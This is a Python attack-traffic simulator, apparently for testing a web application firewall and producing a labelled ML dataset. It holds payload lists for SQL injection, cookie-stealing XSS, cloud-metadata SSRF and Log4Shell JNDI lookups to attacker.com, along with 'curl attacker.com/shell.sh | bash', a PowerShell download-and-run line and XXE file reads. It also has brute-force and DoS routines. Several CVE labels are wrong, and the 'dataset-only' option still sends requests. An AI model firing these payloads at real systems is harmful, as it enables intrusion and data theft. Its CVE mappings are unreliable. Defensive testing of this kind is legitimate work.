"""
VIREX Attack Simulator - CVE-Based Edition
==========================================
Simulates realistic attack traffic mapped to real CVEs.
Also generates a labeled CSV dataset for ML training.

CVEs covered:
  SQLi         -> CVE-2019-9193, CVE-2012-3153
  XSS          -> CVE-2021-26855 (ProxyLogon reflection), CVE-2020-11022 (jQuery)
  SSRF         -> CVE-2021-22986 (F5 BIG-IP), CVE-2019-11043 (php-fpm)
  Path Traversal -> CVE-2021-41773 (Apache), CVE-2019-18935
  Log4Shell    -> CVE-2021-44228
  RCE/CmdInj  -> CVE-2021-22205 (GitLab), CVE-2020-14882 (WebLogic)
  Brute Force  -> CVE-2019-1040 (NTLM relay, auth bypass)
  XXE          -> CVE-2021-27065
  CSRF         -> OWASP A01-based
"""

import os
import csv
import json
import time
import uuid
import random
import datetime
from concurrent.futures import ThreadPoolExecutor

import requests

# ─────────────────────────── CVE KNOWLEDGE BASE ───────────────────────────

CVE_DB = {
    "sqli": [
        {
            "cve": "CVE-2019-9193",
            "description": "PostgreSQL COPY TO/FROM allows arbitrary file read/write via SQL injection",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "1'; COPY (SELECT '') TO PROGRAM 'id'; --",
                "' UNION SELECT username,password,3 FROM pg_shadow--",
                "1' OR '1'='1' --",
                "admin'--",
                "' OR 1=1#",
            ],
        },
        {
            "cve": "CVE-2012-3153",
            "description": "Oracle Reports SQL injection via reporttype parameter",
            "severity": "HIGH",
            "cvss": 7.5,
            "payloads": [
                "' UNION SELECT NULL,NULL,NULL FROM dual--",
                "1 AND 1=2 UNION SELECT 1,user,3 FROM dual--",
                "' OR 'x'='x",
            ],
        },
        {
            "cve": "CVE-2021-32745",
            "description": "Time-based blind SQLi in Cacti graph_view.php",
            "severity": "HIGH",
            "cvss": 8.8,
            "payloads": [
                "1; WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
        },
    ],
    "xss": [
        {
            "cve": "CVE-2020-11022",
            "description": "jQuery XSS via htmlPrefilter (< 3.5.0)",
            "severity": "MEDIUM",
            "cvss": 6.1,
            "payloads": [
                "<img src='x' onerror='alert(document.cookie)'>",
                "<div onmouseover='alert(1)'>hover me</div>",
                "<svg><script>alert&#40;1&#41;</script></svg>",
            ],
        },
        {
            "cve": "CVE-2021-26855",
            "description": "Exchange Server SSRF + reflected XSS (ProxyLogon)",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "'\"><script>new Image().src='http://evil.com/?'+document.cookie</script>",
                "<body onload=alert(1)>",
            ],
        },
        {
            "cve": "CVE-2019-11358",
            "description": "jQuery prototype pollution leading to XSS",
            "severity": "MEDIUM",
            "cvss": 6.1,
            "payloads": [
                "<script>Object.prototype.nodeName='SCRIPT'</script>",
                "<details/open/ontoggle=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
            ],
        },
    ],
    "ssrf": [
        {
            "cve": "CVE-2021-22986",
            "description": "F5 BIG-IP iControl REST SSRF / RCE (unauthenticated)",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://127.0.0.1:8080/manager/html",
                "http://localhost/admin",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud IMDS
                "http://192.168.0.1/cgi-bin/luci",
            ],
        },
        {
            "cve": "CVE-2019-11043",
            "description": "PHP-FPM SSRF / RCE via nginx fastcgi misconfiguration",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "http://127.0.0.1:9000/",
                "http://[::1]:9000/",
                "file:///etc/passwd",
                "dict://127.0.0.1:11211/stat",
                "gopher://127.0.0.1:6379/_PING",
            ],
        },
    ],
    "path_traversal": [
        {
            "cve": "CVE-2021-41773",
            "description": "Apache HTTP Server 2.4.49 path traversal and RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/../../../etc/shadow",
                "/..%2F..%2F..%2Fetc%2Fpasswd",
                "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/static/../../../etc/hosts",
                "....//....//....//etc/passwd",
            ],
        },
        {
            "cve": "CVE-2019-18935",
            "description": "Telerik UI for ASP.NET AJAX path traversal / RCE",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
                "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
        },
    ],
    "log4shell": [
        {
            "cve": "CVE-2021-44228",
            "description": "Apache Log4j2 JNDI injection RCE (Log4Shell)",
            "severity": "CRITICAL",
            "cvss": 10.0,
            "payloads": [
                "${jndi:ldap://attacker.com/a}",
                "${jndi:ldaps://evil.com:1389/Exploit}",
                "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/}",
                "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
                "${jndi:dns://attacker.com}",
                "${j${::-n}di:ldap://attacker.com/a}",
                "${jndi:rmi://attacker.com/payload}",
            ],
        },
        {
            "cve": "CVE-2021-45046",
            "description": "Log4j2 bypass for CVE-2021-44228 patch (context lookup)",
            "severity": "CRITICAL",
            "cvss": 9.0,
            "payloads": [
                "${jndi:ldap://127.0.0.1#attacker.com:1389/a}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/poc}",
            ],
        },
    ],
    "cmd_injection": [
        {
            "cve": "CVE-2021-22205",
            "description": "GitLab CE/EE remote code execution via image parsing",
            "severity": "CRITICAL",
            "cvss": 10.0,
            "payloads": [
                "; id",
                "| whoami",
                "& net user",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "|| ping -c 3 attacker.com",
                "\"; exec('id')",
            ],
        },
        {
            "cve": "CVE-2020-14882",
            "description": "Oracle WebLogic Server remote code execution",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "payloads": [
                "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.handles.MBeanHandle",
                "; curl http://attacker.com/shell.sh | bash",
                "& powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
            ],
        },
    ],
    "xxe": [
        {
            "cve": "CVE-2021-27065",
            "description": "Microsoft Exchange Server XXE via OAB virtual directory",
            "severity": "HIGH",
            "cvss": 7.8,
            "payloads": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
                "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/shadow'>]><data>&file;</data>",
                "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><foo>&xxe;</foo>",
            ],
        },
    ],
    "brute_force": [
        {
            "cve": "CVE-2019-1040",
            "description": "Windows NTLM authentication bypass / relay attack",
            "severity": "HIGH",
            "cvss": 5.9,
            "payloads": None,  # no payload, it's volumetric
        },
    ],
}

# ─────────────────────────── SIMULATOR CLASS ───────────────────────────────

class AttackSimulator:
    """CVE-based attack simulator for VIREX WAF testing + ML dataset generation"""

    def __init__(self, base_url=None):
        self.base_url = base_url or os.getenv("API_URL", "http://localhost:5000")
        self.session = requests.Session()

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
        ]
        self.scanner_agents = [
            "sqlmap/1.8.3#stable",
            "Nmap Scripting Engine; https://nmap.org/book/nse.html",
            "Nikto/2.5.0",
            "nuclei/2.9.1",
            "masscan/1.3.2",
        ]
        self.referers = [
            "https://shop.example.com/",
            "https://shop.example.com/products",
            "https://shop.example.com/cart",
            "https://shop.example.com/checkout",
        ]
        self.legit_users = ["ahmed.hassan", "sara.ali", "omar.khalid", "lina.mostafa", "nour.ibrahim"]

        # Dataset accumulator
        self.dataset_rows = []

    # ──────────────── helpers ────────────────

    def _random_ip(self):
        return f"{random.randint(11, 223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _client_context(self, client_type="normal") -> dict:
        if client_type == "scanner":
            agent = random.choice(self.scanner_agents)
            referer = ""
        else:
            agent = random.choice(self.user_agents)
            referer = random.choice(self.referers)
        return {
            "ip": self._random_ip(),
            "headers": {
                "User-Agent": agent,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": random.choice(["en-US,en;q=0.9", "ar-EG,ar;q=0.9,en;q=0.8"]),
                "Referer": referer,
                "X-Forwarded-For": self._random_ip(),
                "X-Real-IP": self._random_ip(),
                "X-Request-ID": str(uuid.uuid4()),
            },
        }

    def _request(self, method, path, context, params=None, json_data=None, headers_extra=None, timeout=5):
        url = f"{self.base_url}{path}"
        headers = dict(context["headers"])
        headers["X-Forwarded-For"] = context["ip"]
        headers["X-Real-IP"] = context["ip"]
        headers["X-Request-ID"] = str(uuid.uuid4())
        if headers_extra:
            headers.update(headers_extra)
        try:
            if method == "GET":
                return self.session.get(url, params=params, headers=headers, timeout=timeout)
            return self.session.post(url, json=json_data, headers=headers, timeout=timeout)
        except requests.exceptions.ConnectionError:
            return None
        except Exception:
            return None

    def _pause(self, lo=0.15, hi=0.9):
        time.sleep(random.uniform(lo, hi))

    def _log_dataset(self, attack_type, cve, cvss, severity, payload, label, status_code):
        """Append one row to the in-memory dataset."""
        self.dataset_rows.append({
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "attack_type": attack_type,
            "cve": cve,
            "cvss_score": cvss,
            "severity": severity,
            "payload_snippet": str(payload)[:120],
            "label": label,           # 1 = attack, 0 = benign
            "status_code": status_code if status_code else "N/A",
        })

    def _pick_cve(self, attack_type):
        entries = CVE_DB.get(attack_type, [])
        return random.choice(entries) if entries else {}

    # ──────────────── attack methods ────────────────

    def sql_injection_attacks(self, num_attacks=10):
        print(f"  [SQLi] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("sqli")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            vector = random.choice(["users", "orders", "data", "login"])
            r = None
            if vector == "users":
                r = self._request("GET", "/api/users", context, params={"search": payload})
            elif vector == "orders":
                r = self._request("GET", "/api/orders", context, params={"user": payload})
            elif vector == "data":
                r = self._request("POST", "/api/data", context, json_data={"query": payload})
            else:
                r = self._request("POST", "/api/login", context,
                                  json_data={"username": payload, "password": "test"})
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} ip={context['ip']} status={code}")
            self._log_dataset("sqli", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.1, 0.4)

    def xss_attacks(self, num_attacks=10):
        print(f"  [XSS] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("xss")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            body = {"name": "TestUser", "email": "x@x.com", "comment": payload}
            r = self._request("POST", "/api/data", context, json_data=body)
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} ip={context['ip']} status={code}")
            self._log_dataset("xss", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.1, 0.35)

    def ssrf_attacks(self, num_attacks=10):
        print(f"  [SSRF] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("ssrf")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            r = self._request("POST", "/api/data", context,
                              json_data={"url": payload, "fetch": True})
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} target={payload[:50]} status={code}")
            self._log_dataset("ssrf", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.2, 0.6)

    def path_traversal_attacks(self, num_attacks=10):
        print(f"  [PathTraversal] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("path_traversal")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            r = self._request("GET", payload, context)
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} path={payload[:50]} status={code}")
            self._log_dataset("path_traversal", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.1, 0.4)

    def log4shell_attacks(self, num_attacks=8):
        print(f"  [Log4Shell] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("log4shell")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            # Inject in multiple vectors: headers + body
            extra_headers = {
                "User-Agent": payload,
                "X-Forwarded-For": payload,
                "X-Api-Version": payload,
            }
            body = {"username": payload, "password": "test", "message": payload}
            r = self._request("POST", "/api/login", context,
                              json_data=body, headers_extra=extra_headers)
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} ip={context['ip']} status={code}")
            self._log_dataset("log4shell", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.15, 0.5)

    def cmd_injection_attacks(self, num_attacks=8):
        print(f"  [CmdInjection] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("cmd_injection")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            r = self._request("POST", "/api/data", context,
                              json_data={"cmd": payload, "input": payload})
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} ip={context['ip']} status={code}")
            self._log_dataset("cmd_injection", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.1, 0.4)

    def xxe_attacks(self, num_attacks=6):
        print(f"  [XXE] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            cve_entry = self._pick_cve("xxe")
            payload = random.choice(cve_entry["payloads"])
            context = self._client_context("attacker")
            r = self._request("POST", "/api/data", context,
                              json_data={"xml": payload, "data": payload},
                              headers_extra={"Content-Type": "application/xml"})
            code = r.status_code if r else None
            print(f"    [{cve_entry['cve']}] CVSS:{cve_entry['cvss']} ip={context['ip']} status={code}")
            self._log_dataset("xxe", cve_entry["cve"], cve_entry["cvss"],
                              cve_entry["severity"], payload, 1, code)
            self._pause(0.15, 0.5)

    def brute_force_login(self, num_attempts=20):
        print(f"  [BruteForce] Simulating {num_attempts} attempts... (CVE-2019-1040)")
        cve_entry = self._pick_cve("brute_force")
        usernames = ["admin", "root", "ahmed.hassan", "support", "administrator", "webmaster"]
        passwords = ["123456", "password", "admin123", "letmein", "P@ssw0rd", "qwerty", "12345678"]
        context = self._client_context("attacker")
        for i in range(num_attempts):
            uname = random.choice(usernames)
            passwd = random.choice(passwords)
            r = self._request("POST", "/api/login", context,
                              json_data={"username": uname, "password": passwd})
            code = r.status_code if r else None
            if i % 5 == 0:
                print(f"    [CVE-2019-1040] attempt {i+1}/{num_attempts} ip={context['ip']} status={code}")
            self._log_dataset("brute_force", "CVE-2019-1040", 5.9,
                              "HIGH", f"{uname}:{passwd}", 1, code)
            self._pause(0.08, 0.3)

    def csrf_attacks(self, num_attacks=10):
        print(f"  [CSRF] Simulating {num_attacks} attacks...")
        for i in range(num_attacks):
            context = self._client_context("attacker")
            data = {
                "name": "Victim",
                "email": f"victim{random.randint(100,999)}@mail.com",
                "amount": random.randint(100, 5000),
                "action": "transfer",
            }
            # No CSRF token - OWASP A01
            r = self._request("POST", "/api/data", context, json_data=data)
            code = r.status_code if r else None
            print(f"    [OWASP-A01-CSRF] ip={context['ip']} status={code}")
            self._log_dataset("csrf", "OWASP-A01", 6.5, "MEDIUM", json.dumps(data)[:80], 1, code)
            self._pause(0.2, 0.6)

    def scanner_simulation(self, num_scans=12):
        print(f"  [Scanner] Simulating {num_scans} probes...")
        sensitive_paths = [
            "/admin", "/.env", "/wp-admin", "/phpmyadmin", "/backup.sql",
            "/.git/config", "/.git/HEAD", "/api/swagger.json", "/actuator/env",
            "/actuator/heapdump", "/.aws/credentials", "/server-status",
            "/xmlrpc.php", "/cgi-bin/test.cgi", "/web.config",
        ]
        context = self._client_context("scanner")
        for i in range(num_scans):
            path = random.choice(sensitive_paths)
            r = self._request("GET", path, context)
            code = r.status_code if r else None
            print(f"    [Recon] path={path} status={code}")
            self._log_dataset("recon", "N/A", 0, "LOW", path, 1, code)
            self._pause(0.05, 0.25)

    def dos_attacks(self, num_threads=8, requests_per_thread=15):
        print(f"  [DoS] Simulating burst: {num_threads} threads x {requests_per_thread} reqs...")
        def worker(wid):
            context = self._client_context("attacker")
            for _ in range(requests_per_thread):
                r = self._request("POST", "/api/data", context,
                                  json_data={"data": "A" * random.randint(500, 3000)})
                code = r.status_code if r else None
                self._log_dataset("dos", "N/A", 0, "HIGH", "large_payload", 1, code)
                self._pause(0.01, 0.05)
        with ThreadPoolExecutor(max_workers=num_threads) as exe:
            exe.map(worker, range(num_threads))

    def legitimate_traffic(self, num_requests=40):
        print(f"  [Legit] Generating {num_requests} normal requests...")
        for i in range(num_requests):
            context = self._client_context("normal")
            op = random.choice(["products", "users", "orders", "data"])
            r = None
            if op == "products":
                r = self._request("GET", "/api/products", context,
                                  params={"category": random.choice(["phones", "laptops", "tablets"])})
            elif op == "users":
                r = self._request("GET", "/api/users", context,
                                  params={"search": random.choice(["ahmed", "sara", "omar"])})
            elif op == "orders":
                r = self._request("GET", "/api/orders", context,
                                  params={"user": random.choice(self.legit_users)})
            else:
                r = self._request("POST", "/api/data", context, json_data={
                    "name": random.choice(["Ahmed", "Sara", "Omar", "Lina"]),
                    "email": f"client{random.randint(10, 999)}@example.com",
                    "message": "Normal user inquiry",
                })
            code = r.status_code if r else None
            self._log_dataset("benign", "N/A", 0, "NONE",
                              f"normal_{op}", 0, code)
            if i % 10 == 0:
                print(f"    [Legit] {i+1}/{num_requests} ip={context['ip']} status={code}")
            self._pause(0.2, 1.0)

    # ──────────────── dataset export ────────────────

    def export_dataset(self, path="data/cve_attack_dataset.csv"):
        os.makedirs(os.path.dirname(path) if os.path.dirname(path) else ".", exist_ok=True)
        fields = ["timestamp", "attack_type", "cve", "cvss_score", "severity",
                  "payload_snippet", "label", "status_code"]
        with open(path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fields)
            writer.writeheader()
            writer.writerows(self.dataset_rows)
        print(f"\n✅ Dataset exported → {path}  ({len(self.dataset_rows)} rows)")

    # ──────────────── mixed simulation ────────────────

    def mixed_attack_simulation(self, duration_seconds=90):
        print(f"\n{'='*65}")
        print(f" Mixed CVE-based simulation for {duration_seconds}s")
        print(f"{'='*65}\n")

        attack_funcs = [
            (lambda: self.sql_injection_attacks(random.randint(2, 5)),    "SQL Injection"),
            (lambda: self.xss_attacks(random.randint(2, 5)),              "XSS"),
            (lambda: self.ssrf_attacks(random.randint(2, 4)),             "SSRF"),
            (lambda: self.path_traversal_attacks(random.randint(2, 4)),   "Path Traversal"),
            (lambda: self.log4shell_attacks(random.randint(2, 4)),        "Log4Shell"),
            (lambda: self.cmd_injection_attacks(random.randint(2, 4)),    "Command Injection"),
            (lambda: self.xxe_attacks(random.randint(1, 3)),              "XXE"),
            (lambda: self.brute_force_login(random.randint(5, 12)),       "Brute Force"),
            (lambda: self.csrf_attacks(random.randint(2, 4)),             "CSRF"),
            (lambda: self.scanner_simulation(random.randint(3, 7)),       "Scanner/Recon"),
            (lambda: self.dos_attacks(num_threads=random.randint(2, 4),
                                      requests_per_thread=8),             "DoS"),
        ]

        start = time.time()
        while time.time() - start < duration_seconds:
            random.shuffle(attack_funcs)
            for func, name in attack_funcs:
                if time.time() - start >= duration_seconds:
                    break
                print(f"\n--- [ATTACK] {name} ---")
                func()
                print("  [INFO] Inserting legitimate traffic...")
                self.legitimate_traffic(random.randint(3, 8))
                self._pause(0.5, 1.5)

            print("\n[INFO] Cycle complete.\n")
            self._pause(2, 4)

    # ──────────────── entrypoint ────────────────

    def run(self):
        print("🚀 VIREX CVE-Based Attack Simulator")
        print("=" * 65)
        print("CVEs: Log4Shell · ProxyLogon · Apache 2.4.49 · F5 BIG-IP · GitLab RCE · Exchange XXE")
        print("=" * 65)

        try:
            resp = self.session.get(f"{self.base_url}/health", timeout=3)
            print(f"✅ API reachable (status {resp.status_code})\n")
        except Exception:
            print("⚠️  Cannot reach the API — running in dataset-only mode.\n")

        try:
            cycle = 0
            while True:
                cycle += 1
                print(f"\n🔄 Simulation Cycle #{cycle}")
                dur = random.randint(60, 130)
                self.mixed_attack_simulation(duration_seconds=dur)

                # Export dataset after each cycle
                self.export_dataset(f"data/cve_dataset_cycle{cycle}.csv")

                print(f"→ Next cycle in ~10s...\n")
                time.sleep(random.uniform(8, 12))

        except KeyboardInterrupt:
            print("\n🛑 Simulation stopped by user.")
            self.export_dataset("data/cve_dataset_final.csv")


# ─────────────────────────── CLI entry ────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="VIREX CVE-Based Attack Simulator")
    parser.add_argument("--url", default=None, help="Base API URL (default: http://localhost:5000)")
    parser.add_argument("--dataset-only", action="store_true",
                        help="Generate dataset without sending real requests")
    parser.add_argument("--export", default="data/cve_attack_dataset.csv",
                        help="Path to export dataset CSV")
    args = parser.parse_args()

    sim = AttackSimulator(base_url=args.url)

    if args.dataset_only:
        # Run one cycle without caring about API responses
        sim.mixed_attack_simulation(duration_seconds=60)
        sim.export_dataset(args.export)
    else:
        sim.run()